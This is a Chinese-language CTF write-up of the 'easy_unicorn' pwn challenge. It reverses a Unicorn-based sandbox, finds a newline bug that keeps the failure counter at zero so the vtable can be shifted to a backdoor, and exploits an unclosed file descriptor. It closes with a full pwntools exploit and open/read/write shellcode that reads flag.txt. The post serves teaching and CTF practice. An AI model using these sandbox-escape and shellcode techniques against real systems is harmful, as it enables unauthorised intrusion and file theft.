---
layout:     post
title:      "easy_unicorn"
subtitle:   "基于unicorn的"沙盒逃逸""
date:       2020-03-10 11:00:00
author:     "b0ldfrev"
catalog: true
tags:
    - Pwn
    - CTF
 
---

## unicorn

Unicorn 是一款非常优秀的跨平台模拟执行框架，该框架可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, & X86 (include X86_64)等指令集的原生程序。

一些学习资料：

[https://bbs.pediy.com/thread-253868.htm](https://bbs.pediy.com/thread-253868.htm)

[官方实例](https://github.com/unicorn-engine/unicorn/tree/master/samples)

## easy_unicorn

这是一个由unicorn构建的沙盒功能程序。主程序从文件加载特殊二进制程序xctf_pwn.dump后，再根据自己一套特殊的映射方式，在沙盒里面重新映射并运行新程序。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  int i; // [rsp+2Ch] [rbp-74h]
  char v9; // [rsp+30h] [rbp-70h]
  int v10; // [rsp+70h] [rbp-30h]
  __int16 v11; // [rsp+74h] [rbp-2Ch]
  int v12; // [rsp+80h] [rbp-20h]
  __int16 v13; // [rsp+84h] [rbp-1Ch]
  unsigned __int64 v14; // [rsp+88h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  for ( i = 0; i < argc; ++i )
  {
    if ( !strcmp(argv[i], "-info") )
      show_info = 1;
    if ( !strcmp(argv[i], "-debug") )
      debug = 1;
    if ( !strcmp(argv[i], "-tcode") )
      tcode = 1;
  }
  x86_sandbox::x86_sandbox(&v9, "xctf_pwn.dump", 8LL, (unsigned __int8)show_info);
  v10 = -1869574000;
  v11 = 144;
  v12 = -1869574000;
  v13 = 144;
  v3 = x86_sandbox::operator uc_struct *(&v9);
  uc_mem_write(v3, 140737351970632LL, &v10, 5LL);
  v4 = x86_sandbox::operator uc_struct *(&v9);
  uc_mem_write(v4, 140737351970660LL, &v12, 5LL);
  if ( tcode )
    x86_sandbox::add_code_hook((x86_sandbox *)&v9);
  x86_sandbox::Disable_file_RDWR((x86_sandbox *)&v9);
  x86_sandbox::add_syscall_hook((x86_sandbox *)&v9);
  x86_sandbox::add_unmap_hook((x86_sandbox *)&v9);
  x86_sandbox::show_regs((x86_sandbox *)&v9);
  v5 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "/------------------------Sandbox Start-------------------------\\");
  std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  x86_sandbox::engine_start((x86_sandbox *)&v9);
  v6 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "\\-------------------------Sandbox Exit--------------------------/");
  std::ostream::operator<<(v6, &std::endl<char,std::char_traits<char>>);
  x86_sandbox::show_regs((x86_sandbox *)&v9);
  x86_sandbox::~x86_sandbox((x86_sandbox *)&v9);
  return 0;
}

```


据分析可知，在沙盒中运行的新的程序应该是静态链接的，且功能也有限，它的所有系统调用都通过`uc_hook_add`来递交给主程序处理。

```c
__int64 __fastcall x86_sandbox::add_syscall_hook(x86_sandbox *uc)
{
  __int64 v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *((_DWORD *)uc + 2) = uc_hook_add(*(_QWORD *)uc, &v2, 2LL, sandbox_safe_syscall, uc, 0LL, -1LL, 699LL);
  return v2;
}
```

```c

signed __int64 __fastcall sandbox_safe_syscall(__int64 uc, x86_sandbox *data)
{

............

uc_reg_read(uc, UC_X86_REG_RAX, &v14);
  uc_reg_read(uc, UC_X86_REG_RBX, (char *)&v14 + 8);
  uc_reg_read(uc, UC_X86_REG_RCX, &v15);
  uc_reg_read(uc, UC_X86_REG_RDX, &nbytes);
  uc_reg_read(uc, UC_X86_REG_RSI, v17);
  uc_reg_read(uc, UC_X86_REG_RDI, fd);
  uc_reg_read(uc, UC_X86_REG_RIP, &v19);
  if ( (_QWORD)v14 == 3LL )
  {
    v13 = 0LL;
LABEL_49:
    if ( debug )
      printf("[ rax:0x%llx syscall at %p  ret 0x%llx ] \n", (_QWORD)v14, v19, v13, v11);
    uc_reg_write(uc, 35LL, &v13);
    return 1LL;
  }
  if ( (signed __int64)v14 <= 3 )
  {
    if ( (_QWORD)v14 == 1LL )
    {
      if ( debug )
        printf("sandbox:  sys_write(fd=%d, buf=%p, count:%d)", *(_QWORD *)fd, *(_QWORD *)v17, nbytes, data);
      ptr = malloc(nbytes);
      uc_mem_read(uc, *(_QWORD *)v17, ptr, nbytes);
      write(fd[0], ptr, nbytes);
      free(ptr);
      v13 = nbytes;
    }


............

```

我hook主程序的`engine_start`函数，把运行在沙盒里面的程序从0x400000地址开始dump出来。

```c

ssize_t __fastcall my_engine_start_hook(__int64 *a1)
{
  __int64 v1; // r14
  void *v2; // r15
  int v3; // eax

  v1 = *a1;
  v2 = malloc(0x200000uLL);
  uc_mem_read(v1, &dword_400000, v2, 0x100000LL);
  v3 = open("D", 1);
  return write(v3, v2, 0x100000uLL);
}

```

原附件，patch程序以及dump出的程序下载：[https://github.com/b0ldfrev/project/tree/master/pwn/easy_unicorn](https://github.com/b0ldfrev/project/tree/master/pwn/easy_unicorn)

dump后的程序再拖入ida就能正常识别了，由于符号表和调用方式的缘故，有一些c库函数的调用无法准确识别，不过可以根据elf中的少量字符串猜测函数功能。

```c
  key_c = ptr->cpuid_1;
  key_d = v3;
  for ( i = 0; i <= 14; ++i )
    *((_BYTE *)&key_c + i) ^= *((_BYTE *)&key_c + i + 1);
  v4 = (unsigned int)key_c;
  printf(
    (__int64)"Your machine-code is \x1B[1;31;5m %08X-%08X-%08X-%08X \x1B[0m\n",
    (unsigned int)key_c,
    HIDWORD(key_c),
    (unsigned int)key_d,
    HIDWORD(key_d));

```

这个函数中可以看出，cpuid_1可以反推，cpuid_1在unicorn沙盒中获取的值是不变的。

```c
  input = get_input_to_hex(ptr_, (__int64)cpuid_1, a3, a4, a5);
  if ( (unsigned int)memcmp((__int64)cpuid_1, input, 16LL) )
  {
    vtable_plus((sandbox *)ptr_);
    puts("\x1B[1;33mtry again\x1B[0m\n");
    result = 0LL;
  }
  else
  {
    puts("WOW. you can really dance. \n");
    result = 1LL;
  }

```

最后cpuid_1和输入的值to_hex比较16字节，一致就返回1，这里我们反推cpuid_1的值

得出正确密文`062F392D417574680083100500080000`


再之后就会调用 ` (*((void (__fastcall **)(sandbox *, __int64))ptr.vtable + 1))(&ptr, ptr_3);`


程序中给vtable赋初值的地方


```c
__int64 __fastcall sub_40149E(sandbox *ptr)
{
  sub_4013FC(ptr);
  ptr->vtable = off_401900;
  return puts("\n\n############## Safe_Server ####################");
}

```


```python
LOAD:0000000000401900 78 14 40 00 00 00+off_401900      dq offset print_safe_mode
LOAD:0000000000401900 00 00                                                     ; DATA XREF: sub_40149E+19↑o
LOAD:0000000000401900                                                           ; sub_4014F0+C↑o
LOAD:0000000000401908 28 14 40 00 00 00+                dq offset open_flag
LOAD:0000000000401910 00 00 00 00 00 00+_ZTV12RemoteServer dq 0                 ; offset to this
LOAD:0000000000401910 00 00                                                     ; offset to this
LOAD:0000000000401918 58 19 40 00 00 00+                dq offset _ZTI12RemoteServer
LOAD:0000000000401920 AE 11 40 00 00 00+off_401920      dq offset print_ubuntu  ; DATA XREF: sub_4013E4+8↑o
LOAD:0000000000401920 00 00                                                     ; sub_4013FC+1C↑o
LOAD:0000000000401928 C8 11 40 00 00 00+                dq offset backdoor

```

可以看到最终会调用`ptr.vtable + 1`也就是open_flag函数里面：

```c
__int64 __fastcall open_flag(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 v4; // r8
  __int64 result; // rax

  puts("interactive mode Disable\n");
  printf((__int64)"but do you like flag? [Y/n]", a2, v2, v3, v4);
  result = getchar();
  if ( (_BYTE)result != 'n' && (_BYTE)result != 'N' )
  {
    puts("First blood to you ");
    result = get_flag("flag.txt");
  }
  return result;
}

```

我们程序执行输入正确密文，后报错如下：

```
############## Safe_Server ####################
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
[ Disable system call safe mode ]

Your machine-code is  6C141629-681C0134-05159383-00000808 
You need to get the server passwd from vendor(xxxxxxx@qq.com) with machine-code
your password << 062F392D417574680083100500080000
Your key is 062F392D417574680083100500080000
WOW. you can really dance. 

interactive mode Disable

but do you like flag? [Y/n]y
First blood to you 
sandbox: open(filename=flag.txt, flags=0x0, mode=438) was forbidden
 (�s#-_-)�s  flag.txt not found! why?
Good


##############   ServerEnd  ####################


```

似乎open这个系统调用在沙盒中被禁用了，去看看主程序在`sandbox_safe_syscall`函数中的与过滤open调用相关的代码：

```c
__int64 __fastcall x86_sandbox::file_open(x86_sandbox *uc, const char *str, int flags, unsigned int mode)
{
  unsigned int var_28; // [rsp+8h] [rbp-28h]
  unsigned int oflag; // [rsp+Ch] [rbp-24h]
  unsigned int fd; // [rsp+24h] [rbp-Ch]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  oflag = flags;
  var_28 = mode;
  v8 = __readfsqword(0x28u);
  fd = open(str, flags, mode);
  if ( !fd )
    return fd;
  std::vector<int,std::allocator<int>>::emplace_back<int &>((char *)uc + 16, &fd);
  if ( *((_BYTE *)uc + 40) == 1 )
    return fd;
  printf("sandbox: open(filename=%s, flags=0x%x, mode=%d) was forbidden\n", str, oflag, var_28);
  return 0xFFFFFFFFLL;
}

```

str，flags，mode这三个参数都是从unicorn沙盒中取出的参数，程序明显在沙盒外实现了open函数调用，分析代码，外层open返回的fd似乎并没有传给unicorn里的程序，直接抛出个forbidden结束。


再去看看沙盒里面的程序，我们没有办法通过`open_flag`虚表函数直接获取flag，看到它虚表下面有一个后门函数

```python

LOAD:0000000000401900 78 14 40 00 00 00+off_401900      dq offset print_safe_mode
LOAD:0000000000401900 00 00                                                     ; DATA XREF: sub_40149E+19↑o
LOAD:0000000000401900                                                           ; sub_4014F0+C↑o
LOAD:0000000000401908 28 14 40 00 00 00+                dq offset open_flag
LOAD:0000000000401910 00 00 00 00 00 00+_ZTV12RemoteServer dq 0                 ; offset to this
LOAD:0000000000401910 00 00                                                     ; offset to this
LOAD:0000000000401918 58 19 40 00 00 00+                dq offset _ZTI12RemoteServer
LOAD:0000000000401920 AE 11 40 00 00 00+off_401920      dq offset print_ubuntu  ; DATA XREF: sub_4013E4+8↑o
LOAD:0000000000401920 00 00                                                     ; sub_4013FC+1C↑o
LOAD:0000000000401928 C8 11 40 00 00 00+                dq offset backdoor


```

```c
__int64 backdoor()
{

.....
  __int64 a2; // [rsp+40h] [rbp-510h]
  unsigned __int64 v10; // [rsp+548h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("Welcome to ubuntu shell\n");
  puts("please write your shellcode i will run  [ size_t (*intput)(size_t , size_t , size_t ) ]");
  printf((__int64)"data ptr:%p\n", (__int64)&a2);
  printf((__int64)"data<<", (__int64)&a2);
  read(0LL, (__int64)&a2, 0x500LL);
  printf((__int64)"invoke ptr<<", (__int64)&a2);
  v0 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_400C26();
  printf((__int64)"arg0<<", (__int64)&a2);
  v1 = sub_400C26();
  printf((__int64)"arg1<<", (__int64)&a2);
  v2 = sub_400C26();
  printf((__int64)"arg2<<", (__int64)&a2);
  v3 = sub_400C26();
  v4 = v0(v1, v2, v3);
  printf((__int64)"ret is 0x%llx\n", v4);

.....

}

```

有没有办法能调用到这个函数？看到我们输入password出错的地方

```c
  if ( (unsigned int)memcmp((__int64)cpuid_1, input, 16LL) )
  {
    vtable_plus((sandbox *)ptr_);
    puts("\x1B[1;33mtry again\x1B[0m\n");
    result = 0LL;
  }

```

```c
sandbox *__fastcall sub_401120(sandbox *ptr)
{
  sandbox *result; // rax

  result = ptr;
  ++ptr->vtable;
  return result;
}

```

每当一次错误时，vtable地址会加1，计算一下，输错0x20次就能call到backdoor函数，但是错误超过四次就会报 Connection denied!



```c
    if ( (char)check_count((__int64)&ptr) > 4 )
    {
      puts("\x1B[1;31mConnection denied!\x1B[0m");
      a1 = 0;
      v9 = 0;
      goto LABEL_6;
    }


```

ptr->count在输入的地方根据输入的长度自增：

```c
sandbox *__fastcall get_input_to_hex(sandbox *ptr, __int64 ptr_3, __int64 a3, __int64 a4, __int64 a5)
{
  char a; // al
  char asci; // [rsp+1Eh] [rbp-2h]
  char input; // [rsp+1Eh] [rbp-2h]
  char count; // [rsp+1Fh] [rbp-1h]

  count = 0;
  printf((__int64)"your password << \x1B[32;1m", ptr_3);
  for ( asci = getchar(); asci != '\n'; asci = getchar() )
  {
    input = asci + (asci < 0 ? 0x80 : 0);
    a = count++;
    if ( a == 0x7F )
      break;
    ptr->input[count] = input;
  }
  printf((__int64)"\x1B[0m", ptr_3);
  ptr->input[count + 1] = 0;
  printf((__int64)"Your key is %s\n", (__int64)&ptr->input[1]);
  to_hex(&ptr->input[1], &ptr->input[1], 64);
  LOBYTE(ptr->count) += count;    // 自增
  return (sandbox *)((char *)ptr + 128);
}
```

但是这里有个漏洞，当输入password是一个换行符'\n'时，没有进入for循环，count也就永远是0，

所以我们只需要连续输入0x20次'\n'换行符，最后输入一次正确password就能顺利进入backdoor函数。

下面来仔细分析backdoor函数：

```c

__int64 backdoor()
{

.....
  __int64 a2; // [rsp+40h] [rbp-510h]
  unsigned __int64 v10; // [rsp+548h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  puts("Welcome to ubuntu shell\n");
  puts("please write your shellcode i will run  [ size_t (*intput)(size_t , size_t , size_t ) ]");
  printf((__int64)"data ptr:%p\n", (__int64)&a2);
  printf((__int64)"data<<", (__int64)&a2);
  read(0LL, (__int64)&a2, 0x500LL);
  printf((__int64)"invoke ptr<<", (__int64)&a2);
  v0 = (__int64 (__fastcall *)(__int64, __int64, __int64))sub_400C26();
  printf((__int64)"arg0<<", (__int64)&a2);
  v1 = sub_400C26();
  printf((__int64)"arg1<<", (__int64)&a2);
  v2 = sub_400C26();
  printf((__int64)"arg2<<", (__int64)&a2);
  v3 = sub_400C26();
  v4 = v0(v1, v2, v3);
  printf((__int64)"ret is 0x%llx\n", v4);

.....

}


```

它实现的功能就是在沙盒程序中，任意shellcode执行。execve肯定不行的，主程序根本没有实现它的系统调用，所以唯一可以动手脚的地方就是open来打印flag值。

观察上面主程序的file_open函数，在调用open之后没有close，这就意味着我们打开了一个文件描述符，默认最小原则那就是3，所以我们可以执行一次open后直接用read读取fd=3，将flag读入unicorn内存，再write泄露。


## 最终exp：

```python

from pwn_debug import *
context(os='linux', arch='amd64', log_level='debug')

p= process('./x86_sandbox')

def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        print "breakpoint_addr --> " + hex(text_base + 0x202040)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr))) 

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

for i in range(0x20):
  ru("<< ")
  sl('')

ru("<< ")
sl("062F392D417574680083100500080000")

shellcode = '''
call orw
.asciz "flag.txt"
orw:
pop rdi
xor rdx, rdx
xor rsi, rsi
mov eax, 2
syscall
xor rax, rax
mov edi, 3
mov edx, 0x100
mov rsi, rsp
syscall
mov eax, 1
mov edi, 1
mov rsi, rsp
mov edx, 0x100
syscall
'''
shellcode = asm(shellcode)
ru("ptr:")
ptr = int(p.recvline().strip(), 16)
print hex(ptr)

sla("data<<", shellcode)
sla("ptr<<", str(ptr))
sla("arg0<<", str(ptr))
sla("arg1<<", str(ptr))
sla("arg2<<", str(ptr))

p.interactive()



```